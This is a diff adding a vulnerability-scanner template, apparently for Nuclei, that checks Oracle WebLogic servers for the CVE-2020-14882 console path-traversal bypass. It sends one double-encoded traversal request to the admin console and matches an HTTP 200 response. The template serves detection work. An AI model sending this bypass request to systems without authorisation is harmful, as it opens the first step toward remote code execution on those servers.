@@ -1,0 +1,27 @@
+id: WebLogic-Admin-Handle-RCE-Scanner
+
+info:
+  name: WebLogic admin handle RCE
+  author: c04tl
+  severity: high
+  description: Escanea un path traversal en la implementación del identificador de la consola de administracion de WebLogic para ejecutar código como el usuario WebLogic
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-14882
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-14883
+    - https://nvd.nist.gov/vuln/detail/CVE-2020-14750
+    - https://www.exploit-db.com/exploits/48971
+    - https://www.oracle.com/security-alerts/cpuoct2020.html
+    - https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf
+    - https://github.com/somatrasss/weblogic2021
+  tags: cve,cve2020,oracle,weblogic,metasploit
+
+requests:
+  - raw:
+      - |
+        GET /console/css/%252e%252e%252f/consolejndi.portal HTTP/1.1
+        Host: {{Hostname}}
+        
+    matchers:
+      - type: status
+        status:
+          - 200
